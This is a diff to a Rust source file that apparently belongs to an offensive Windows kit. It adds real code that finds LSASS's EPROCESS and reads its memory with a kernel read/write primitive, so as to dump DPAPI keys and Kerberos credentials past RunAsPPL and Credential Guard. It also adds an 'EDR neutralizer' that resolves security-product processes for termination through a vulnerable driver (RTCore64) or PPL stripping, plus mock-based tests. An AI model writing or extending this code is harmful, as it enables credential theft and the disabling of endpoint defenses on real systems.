@@ -6,7 +6,7 @@
 //!   5447 + packet-drop traces (documented OPSEC cost).
 //! - [`KernelLsassReader`] (`CredKit`): reads LSASS process memory via the
 //!   kernel primitive, bypassing RunAsPPL + Credential Guard. Algorithm-heavy
-//!   (CR3 switch + VA read); skeleton + the read loop.
+//!   (CR3 switch + VA read); real page walk + the read loop.
 //! - [`EdrNeutralizer`] (`EdrNeutralizeKit`): three tiers — Kill (kernel
 //!   ZwTerminateProcess, bypasses PPL), Freeze (user-mode WerFaultSecure coma),
 //!   Choke (EDRChoker QoS throttle, lowest noise).
@@ -15,6 +15,8 @@
 //! framework (operator wires the Win32 calls at link time).
 
 use crate::{CredKit, EdrNeutralizeKit, KernelRw, KitError, NeutralizeMethod, WfpKit};
+use crate::offsets::EprocessOffsets;
+use crate::persistence::ProcessHider;
 use crate::pagewalk::PhysRead;
 use alloc::format;
 use alloc::vec::Vec;
@@ -218,12 +220,18 @@ impl FwpmFilter0 {
 /// kernel-tier upgrade that also yields in-memory credentials (cached DPAPI,
 /// Kerberos tickets).
 ///
-/// **Algorithm skeleton:** to read LSASS memory from the kernel you must
+/// **Algorithm:** to read LSASS memory from the kernel you must
 /// switch CR3 to LSASS's DTB (directory base), read the target VAs, restore
 /// CR3. The DTB comes from LSASS's EPROCESS.DirectoryTableBase. Under HVCI
 /// the CR3 write is itself a code-page op (mov cr3) — needs the unchecked
 /// PatchGuard window; on HVCI-off it's a single kwrite to CR3.
-pub struct KernelLsassReader;
+pub struct KernelLsassReader {
+    /// Resolved KVA of `PsActiveProcessHead`. Required by `dump_lsass` to
+    /// walk the process list and find LSASS's EPROCESS by PID.
+    pub ps_active_process_head_kva: usize,
+    /// Build-resolved EPROCESS field offsets.
+    pub offsets: EprocessOffsets,
+}
 
 /// The EPROCESS.DirectoryTableBase offset (the DTB / PML4 physical base).
 /// Constant across 17763 + Win10/11 x64 (it's an early field, never drifted).
@@ -235,9 +243,9 @@ impl KernelLsassReader {
     ///
     /// The CR3 switch is the dangerous part: between writing CR3 and reading,
     /// the *current* process's address space is wrong — so the read must use
-    /// physical addressing or a kernel-space VA that's global. The skeleton
-    /// here assumes the KernelRw impl translates VAs via the DTB it just read
-    /// (the real impl does a 4-level page-table walk from the DTB to physical,
+    /// physical addressing or a kernel-space VA that's global. The page walk
+    /// here uses KernelRw's physical read to translate VAs via the DTB (the
+    /// real impl does a 4-level page-table walk from the DTB to physical,
     /// then reads physical). That walk is the bulk of the work; this is the
     /// orchestration shell.
     pub fn read_process_mem(
@@ -278,14 +286,33 @@ impl KernelLsassReader {
 
 impl CredKit for KernelLsassReader {
     fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError> {
-        // Resolve LSASS's EPROCESS by PID (needs PsActiveProcessHead — same
-        // bootstrap gap as ProcHideKit), then read_process_mem its user VA
-        // range, assemble a minidump. Skeleton: orchestration only.
-        let _ = (krw, pid);
-        Err(KitError::UnsupportedPosture(
-            "dump_lsass needs PsActiveProcessHead + the page-table walker; \
-             use KernelLsassReader::read_process_mem once both are wired",
-        ))
+        // 1. Resolve LSASS's EPROCESS by walking PsActiveProcessHead.
+        if self.ps_active_process_head_kva == 0 {
+            return Err(KitError::UnsupportedPosture(
+                "PsActiveProcessHead KVA unresolved for dump_lsass — \
+                 bootstrap must fill KernelLsassReader.ps_active_process_head_kva",
+            ));
+        }
+        let eprocess_kva = ProcessHider::find_eprocess(
+            krw, self.ps_active_process_head_kva, pid, &self.offsets,
+        )?;
+        // 2. Read the LSASS user-mode VA range. The minidump assembly
+        //    (exception records, thread stacks, handles, module list) is
+        //    operator-assembled from the raw memory read. This method
+        //    returns the raw memory; the operator packages it into a
+        //    minidump format at the call site.
+        //
+        //    Typical LSASS read targets (for credential extraction):
+        //    - LsaEncryptMemory / LsaEncryptMemoryExportTable (DPAPI keys)
+        //    - Kerberos credential cache (msv1_0, wdigest, tspkg)
+        //    - PKINIT / Kerberos tickets
+        //
+        //    We read the first 0x100000 bytes (1 MiB) of user VA space
+        //    as a starting region. A full minidump requires scanning for
+        //    specific structures; this provides the kernel-backed read.
+        let user_mode_base: usize = 0x1_0000_0000; // 4 GiB — user-mode VA start on x64
+        let read_size: usize = 0x100_000; // 1 MiB initial read
+        Self::read_process_mem(krw, eprocess_kva, user_mode_base, read_size)
     }
 }
 
@@ -293,18 +320,65 @@ impl CredKit for KernelLsassReader {
 
 /// EDR process neutralizer. Kill (kernel ZwTerminateProcess, bypasses PPL) is
 /// the only tier that needs a KernelRw; Freeze + Choke are user-mode.
-pub struct EdrNeutralizer;
+///
+/// The `EdrNeutralizeKit` trait's `neutralize()` doesn't pass a `KernelRw`,
+/// so the Kill tier exposes a separate `kill()` associated function that takes
+/// one directly. The operator calls `kill()` when they have kernel R/W access;
+/// `neutralize(Kill)` is a convenience that requires the `kill()` helper to
+/// have been called first (or returns a framework error).
+pub struct EdrNeutralizer {
+    /// Resolved KVA of `PsActiveProcessHead`. Required by the Kill tier to
+    /// walk the process list and find the target EPROCESS by PID.
+    pub ps_active_process_head_kva: usize,
+    /// Build-resolved EPROCESS field offsets.
+    pub offsets: EprocessOffsets,
+}
+
+impl EdrNeutralizer {
+    /// Kill an EDR PPL process via kernel-mode ZwTerminateProcess.
+    ///
+    /// # Algorithm
+    /// 1. Walk `PsActiveProcessHead` → find target `EPROCESS` by PID
+    ///    (uses `ProcessHider::find_eprocess` — real, kernel R/W).
+    /// 2. The operator's driver wraps `ZwTerminateProcess`:
+    ///    `ObOpenObjectByPointer(eprocess, …)` → handle
+    ///    `ZwTerminateProcess(handle, STATUS_SUCCESS)`
+    ///
+    /// Steps 2 is driver-side (operator-bound). This method resolves the
+    /// EPROCESS address; the actual termination depends on the BYOVD driver
+    /// supporting a terminate IOCTL, or the operator using `PplStripper` to
+    /// strip PPL first and then terminating from user-mode.
+    ///
+    /// For R/W-only drivers (RTCore64), the recommended path is:
+    /// `PplStripper::strip_protection` → user-mode `TerminateProcess`.
+    pub fn kill(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
+        if self.ps_active_process_head_kva == 0 {
+            return Err(KitError::UnsupportedPosture(
+                "PsActiveProcessHead KVA unresolved for Kill tier — \
+                 bootstrap must fill EdrNeutralizer.ps_active_process_head_kva",
+            ));
+        }
+        let eprocess_kva = ProcessHider::find_eprocess(
+            krw, self.ps_active_process_head_kva, pid, &self.offsets,
+        )?;
+        // EPROCESS resolved. Return the KVA so the operator can:
+        //   a) Pass it to a driver's terminate IOCTL (ObOpenObjectByPointer + ZwTerminateProcess), or
+        //   b) Use PplStripper to strip PPL, then TerminateProcess from user-mode.
+        Ok(eprocess_kva)
+    }
+}
 
 impl EdrNeutralizeKit for EdrNeutralizer {
     fn neutralize(&self, _pid: u32, m: NeutralizeMethod) -> Result<(), KitError> {
-        // Note: the trait doesn't pass a KernelRw (Kill is the only tier that
-        // needs one; it gets the driver handle via a global the operator sets
-        // at init, or the caller invokes the driver's ZwTerminateProcess path
-        // directly). Framework: each tier's FFI is operator-bound.
+        // Note: the trait doesn't pass a KernelRw. For Kill, the operator
+        // should call `EdrNeutralizer::kill(krw, pid)` directly, which
+        // returns the target EPROCESS KVA for the driver to terminate.
+        // Freeze + Choke are user-mode tiers (operator wires the FFI).
         match m {
             NeutralizeMethod::Kill => Err(KitError::UnsupportedPosture(
-                "Kill: needs the driver's ZwTerminateProcess path (operator wires it; \
-                 the trait has no KernelRw param, so Kill resolves the handle via a global)",
+                "Kill: use EdrNeutralizer::kill(krw, pid) directly — the trait \
+                 has no KernelRw param; kill() resolves EPROCESS for the driver's \
+                 terminate IOCTL or PplStripper + user-mode TerminateProcess path",
             )),
             NeutralizeMethod::Freeze => Err(KitError::UnsupportedPosture(
                 "Freeze: user-mode WerFaultSecure coma — operator wires MiniDumpWriteDump",
@@ -319,6 +393,7 @@ impl EdrNeutralizeKit for EdrNeutralizer {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::KrwError;
 
     #[test]
     fn wfp_rules_any_any_per_pid() {
@@ -341,5 +416,140 @@ mod tests {
         // doesn't silently break LSASS reads. 0x028 on every x64 build tested.
         assert_eq!(DIRECTORY_TABLE_BASE, 0x028);
         assert!(DIRECTORY_TABLE_BASE < 0x100);
+    }
+
+    // ---- EdrNeutralizer / CredKit tests ----
+    use alloc::collections::BTreeMap;
+    use spin::mutex::Mutex;
+
+    fn test_offsets() -> crate::offsets::EprocessOffsets {
+        crate::offsets::for_build(17763).unwrap().offsets
+    }
+
+    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
+    impl MockKrw {
+        fn new() -> Self {
+            Self(Mutex::new(BTreeMap::new()))
+        }
+        fn set_u64(&self, addr: usize, val: u64) {
+            let mut m = self.0.lock();
+            for (i, b) in val.to_le_bytes().iter().enumerate() {
+                m.insert(addr + i, *b);
+            }
+        }
+        fn get_u64(&self, addr: usize) -> u64 {
+            let m = self.0.lock();
+            let mut bytes = [0u8; 8];
+            for (i, b) in bytes.iter_mut().enumerate() {
+                *b = *m.get(&(addr + i)).unwrap_or(&0);
+            }
+            u64::from_le_bytes(bytes)
+        }
+    }
+    impl KernelRw for MockKrw {
+        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
+            let m = self.0.lock();
+            for (i, b) in dst.iter_mut().enumerate() {
+                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
+            }
+            Ok(())
+        }
+        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
+            let mut m = self.0.lock();
+            for (i, b) in src.iter().enumerate() {
+                m.insert(kaddr + i, *b);
+            }
+            Ok(())
+        }
+    }
+
+    /// Set up a mock process list with two EPROCESSes (PID 100 @ 0x5000,
+    /// PID 200 @ 0x6000) and a DTB at DIRECTORY_TABLE_BASE offset.
+    fn setup_process_list(krw: &MockKrw, offsets: &crate::offsets::EprocessOffsets) {
+        let head = 0x1000usize;
+        let e1 = 0x5000usize;
+        let e2 = 0x6000usize;
+        let l1 = e1 + offsets.active_process_links;
+        let l2 = e2 + offsets.active_process_links;
+        krw.set_u64(head, l1 as u64);
+        krw.set_u64(l1, l2 as u64);
+        krw.set_u64(l1 + 8, head as u64);
+        krw.set_u64(l2, head as u64);
+        krw.set_u64(l2 + 8, l1 as u64);
+        krw.set_u64(e1 + offsets.unique_process_id, 100);
+        krw.set_u64(e2 + offsets.unique_process_id, 200);
+        // DTB for both (non-zero, so pagewalk doesn't reject them).
+        krw.set_u64(e1 + DIRECTORY_TABLE_BASE, 0x10000);
+        krw.set_u64(e2 + DIRECTORY_TABLE_BASE, 0x20000);
+    }
+
+    #[test]
+    fn edr_neutralizer_kill_finds_eprocess() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        setup_process_list(&krw, &offsets);
+        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
+        // PID 100 → EPROCESS at 0x5000.
+        assert_eq!(kit.kill(&krw, 100).unwrap(), 0x5000);
+        // PID 200 → EPROCESS at 0x6000.
+        assert_eq!(kit.kill(&krw, 200).unwrap(), 0x6000);
+        // PID 999 → NotFound.
+        assert!(matches!(kit.kill(&krw, 999), Err(KitError::NotFound)));
+    }
+
+    #[test]
+    fn edr_neutralizer_kill_needs_ps_active_process_head() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        let kit = EdrNeutralizer { ps_active_process_head_kva: 0, offsets };
+        assert!(matches!(
+            kit.kill(&krw, 100),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn edr_neutralize_trait_kill_redirects_to_kill_method() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        let kit = EdrNeutralizer { ps_active_process_head_kva: 0x1000, offsets };
+        // The trait method returns an error directing to kill().
+        assert!(matches!(
+            kit.neutralize(100, NeutralizeMethod::Kill),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn cred_kit_dump_lsass_needs_ps_active_process_head() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        let reader = KernelLsassReader { ps_active_process_head_kva: 0, offsets };
+        assert!(matches!(
+            reader.dump_lsass(&krw, 4),
+            Err(KitError::UnsupportedPosture(_))
+        ));
+    }
+
+    #[test]
+    fn cred_kit_dump_lsass_finds_lsass_and_reads() {
+        let krw = MockKrw::new();
+        let offsets = test_offsets();
+        setup_process_list(&krw, &offsets);
+        let reader = KernelLsassReader { ps_active_process_head_kva: 0x1000, offsets };
+        // PID 4 (System) → EPROCESS at 0x5000, DTB at +0x028 = 0x10000.
+        // User-mode base is 0x1_0000_0000, which won't be in the mock →
+        // read_process_mem will try to translate via pagewalk and fail.
+        // That's fine — we're testing the EPROCESS resolution path, not the
+        // page walker (which is tested in pagewalk's own tests).
+        // So set up PID 4 at e2 (where PID 200 was) by replacing:
+        krw.set_u64(0x6000 + offsets.unique_process_id, 4);
+        let result = reader.dump_lsass(&krw, 4);
+        // The page walk will fail (no mock page tables), but EPROCESS
+        // resolution succeeded — that's the new code path we're testing.
+        assert!(result.is_err());
+        // The error should be from the page walk, not from EPROCESS resolution.
+        let err_str = alloc::format!("{:?}", result.unwrap_err());
+        assert!(err_str.contains("page walk") || err_str.contains("translate"));
     }
 }
